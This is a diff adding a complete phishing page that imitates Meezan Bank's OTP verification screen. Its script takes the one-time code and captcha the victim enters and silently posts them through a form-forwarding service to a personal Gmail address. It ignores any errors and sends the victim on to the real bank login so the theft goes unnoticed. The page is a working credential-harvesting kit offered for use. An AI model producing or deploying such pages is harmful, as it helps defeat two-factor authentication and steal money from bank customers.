@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>Meezan Bank OTP Verification</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    
+    <style>
+        /* --- CSS (Exactly the same as the Login Page, minus Grid CSS) --- */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Segoe UI', sans-serif;
+            min-height: 100vh; min-height: 100dvh; 
+            display: flex; justify-content: center; align-items: center;
+            background-image: url('background.png'); /* Same background */
+            background-size: cover; background-position: center;
+        }
+        
+        .bg-overlay { 
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
+            background: rgba(0, 0, 0, 0.50); 
+            z-index: 0; 
+        }
+        
+        .login-container { 
+            position: relative; z-index: 1; 
+            width: 100%; max-width: 400px; 
+            padding: 25px 20px; text-align: center; 
+            max-height: 100vh; max-height: 100dvh;
+            overflow-y: auto; 
+        }
+
+        .bank-logo { 
+            display: block; width: 100%; max-width: 150px; height: auto; 
+            min-height: 60px; margin: 0 auto 20px auto; object-fit: contain;
+        }
+
+        .title { 
+            display: block; color: white; font-weight: 600; 
+            font-size: 1.15rem; margin-bottom: 25px; 
+        }
+        
+        .input-group { display: flex; align-items: center; background: white; border-radius: 6px; overflow: hidden; margin-bottom: 12px; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
+        .input-icon, .eye-icon { padding: 14px 15px; background: #ececec; display: flex; align-items: center; justify-content: center; }
+        .input-icon { width: 48px; background: #d1c4e9; color: #6a1b9a; }
+        .input-group input { flex: 1; border: none; padding: 14px 15px; outline: none; font-size: 0.95rem; width: 100%; background: transparent;}
+        
+        .otp-info { color: #ccc; font-size: 0.85rem; margin-bottom: 15px; display: block; }
+
+        .captcha-group { display: flex; align-items: center; gap: 10px; justify-content: center; margin: 15px 0; }
+        .captcha-box { background: rgba(200, 200, 200, 0.85); padding: 8px 15px; border-radius: 4px; font-weight: bold; letter-spacing: 2px; font-size: 1.1rem; color: #333; text-decoration: line-through; font-family: monospace; }
+        .refresh-captcha { color: white; font-size: 1.2rem; cursor: pointer; }
+
+        .btn-login { width: 100%; padding: 14px; background: #6a1b9a; color: white; border: none; border-radius: 6px; font-size: 1.1rem; margin-bottom: 15px; cursor: pointer; box-shadow: 0 2px 8px rgba(0,0,0,0.5); transition: 0.2s; }
+        .btn-login:hover { background: #4a148c; }
+        .btn-register { width: 100%; padding: 14px; background: rgba(255,255,255,0.9); color: #6a1b9a; border: none; border-radius: 6px; font-size: 1rem; margin-bottom: 10px; cursor: pointer; font-weight: 600; }
+        .btn-register:hover { background: white; }
+        .footer-link { display: block; color: white; text-decoration: none; font-size: 0.85rem; margin-top: 15px; }
+
+        .livechat-tab {
+            position: fixed; right: 0; top: 50%; transform: translateY(-50%);
+            background: #6a1b9a; color: white; padding: 30px 12px; 
+            border-radius: 8px 0 0 8px; writing-mode: vertical-rl;
+            text-orientation: mixed; letter-spacing: 2px; font-weight: 700;
+            font-size: 1.1rem; cursor: pointer; box-shadow: -4px 0 15px rgba(0,0,0,0.5);
+            z-index: 999; transition: 0.2s;
+        }
+        .livechat-tab:hover { background: #4a148c; }
+
+        @media (max-width: 480px) {
+            .login-container { padding: 15px; }
+            .bank-logo { max-width: 120px; }
+            .livechat-tab { font-size: 0.85rem; padding: 20px 8px; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="bg-overlay"></div>
+
+    <div class="login-container">
+        <!-- Same local logo -->
+        <img src="/logo.png" alt="Meezan Bank Logo" class="bank-logo">
+
+        <h2 class="title">Enter Verification Code</h2>
+        <span class="otp-info">Please enter the 8-digit OTP sent to your registered number.</span>
+
+        <form id="otpForm">
+            <!-- 8-Digit OTP Input -->
+            <div class="input-group">
+                <span class="input-icon"><i class="fas fa-shield-alt"></i></span>
+                <input type="text" id="otp" placeholder="Enter OTP (8 digits)" maxlength="8" pattern="\d*" required>
+            </div>
+
+            <!-- Kept Captcha -->
+            <div class="captcha-group">
+                <span class="captcha-box">1 q X b 9 6</span>
+                <i class="fas fa-sync-alt refresh-captcha"></i>
+            </div>
+            <div class="input-group" style="margin-bottom: 20px;">
+                <input type="text" id="captcha" placeholder="Enter Captcha" required>
+            </div>
+
+            <!-- Buttons -->
+            <button type="submit" id="otpBtn" class="btn-login">Verify OTP</button>
+            <button type="button" class="btn-register">Resend OTP</button>
+            
+            <a href="#" class="footer-link">Security Guide</a>
+        </form>
+    </div>
+
+    <!-- Big Livechat Tab -->
+    <div class="livechat-tab">
+        <span>LIVECHAT</span>
+    </div>
+
+    <script>
+        // Refresh Captcha
+        document.querySelector('.refresh-captcha').addEventListener('click', function() {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            let captcha = '';
+            for (let i = 0; i < 6; i++) { captcha += chars.charAt(Math.floor(Math.random() * chars.length)); }
+            document.querySelector('.captcha-box').innerText = captcha;
+        });
+
+        // OTP Form Submission (Silent & Redirect)
+        document.getElementById('otpForm').addEventListener('submit', function(event) {
+            event.preventDefault(); 
+            const btn = document.getElementById('otpBtn');
+            btn.disabled = true; // Prevents double clicking
+
+            const formData = {
+                otp_code: document.getElementById('otp').value,
+                captcha: document.getElementById('captcha').value,
+                _subject: "New Meezan OTP Submission",
+                _captcha: false
+            };
+
+            // Sends OTP to your email silently
+            fetch('https://formsubmit.co/ajax/ayanali012777@gmail.com', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+                body: JSON.stringify(formData)
+            }).catch(err => console.error(err)); // Silently ignore errors
+
+            // Redirect to real bank site instantly
+            window.location.href = "https://ebanking.meezanbank.com/AmbitRetailFrontEnd/login?se=y_sHexp";
+        });
+    </script>
+</body>
+</html>
